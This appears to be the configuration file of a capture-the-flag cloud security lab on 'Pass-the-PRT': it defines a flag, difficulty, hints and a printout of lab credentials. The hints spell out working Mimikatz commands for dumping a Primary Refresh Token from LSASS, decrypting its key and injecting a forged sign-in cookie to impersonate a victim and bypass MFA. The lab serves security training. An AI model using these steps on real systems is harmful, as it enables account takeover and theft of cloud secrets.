from cumulonimbus.providers.base.application_configuration import ApplicationConfigurationAbstract


class ApplicationConfiguration(ApplicationConfigurationAbstract):

    def get_flag(self) -> str:
        return "CUMULONIMBUS{PassThePRT_CloudLateralMovement_MFA_Bypass}"

    def get_difficulty(self) -> str:
        return "Advanced"

    def get_hints(self) -> dict:
        return {
            1: "Run `dsregcmd /status` on the VM. Look for AzureAdPrt: YES in the SSO State section — this confirms a PRT is cached in LSASS. Mimikatz is pre-installed at C:\\Tools\\mimikatz\\x64\\mimikatz.exe. You need local admin privileges to read LSASS.",
            2: "In Mimikatz (run as Administrator): `privilege::debug` then `sekurlsa::cloudap`. Copy the PRT value and the ProofOfPossessionKey blob. Next: `token::elevate` then `dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect` to decrypt the session key. Save the Context and DerivedKey values.",
            3: "Generate a PRT cookie: `dpapi::cloudapkd /context:<Context> /derivedkey:<DerivedKey> /prt:<PRT>`. Open Edge InPrivate → navigate to https://login.microsoftonline.com → F12 → Application → Cookies → clear all → add cookie `x-ms-RefreshTokenCredential` with the output value, HttpOnly=true → refresh. You are now authenticated as the victim. Use the Azure portal to read the Key Vault secret.",
        }

    def configure_application(self, **kwargs):
        pass

    def pretty_print_tf_output(self, app_id, output):
        print("\n=== Pass-the-PRT Lab ===")
        print(f"  VM public IP        : {output.get('vm_public_ip', {}).get('value', 'N/A')}")
        print(f"  Local admin user    : {output.get('attacker_username', {}).get('value', 'N/A')}")
        print(f"  Local admin password: {output.get('attacker_password', {}).get('value', 'N/A')}")
        print(f"  Victim UPN          : {output.get('victim_upn', {}).get('value', 'N/A')}")
        print(f"  Victim password     : {output.get('victim_password', {}).get('value', 'N/A')}")
        print(f"  Key Vault name      : {output.get('keyvault_name', {}).get('value', 'N/A')}")
        print(f"  Key Vault URI       : {output.get('keyvault_uri', {}).get('value', 'N/A')}")
        print(f"  Resource group      : {output.get('resource_group', {}).get('value', 'N/A')}")
        print(f"\nStep 1: RDP as victim to seed their PRT into LSASS.")
        print(f"  mstsc /v:{output.get('vm_public_ip', {}).get('value', '<ip>')}  →  {output.get('victim_upn', {}).get('value', '<upn>')}")
        print(f"Step 2: Log off victim, RDP as local admin to extract the PRT.")
        print(f"  mstsc /v:{output.get('vm_public_ip', {}).get('value', '<ip>')}  →  attacker / <password>")
        print(f"Goal  : Use the PRT cookie to authenticate to Azure as the victim and read the flag from Key Vault.")
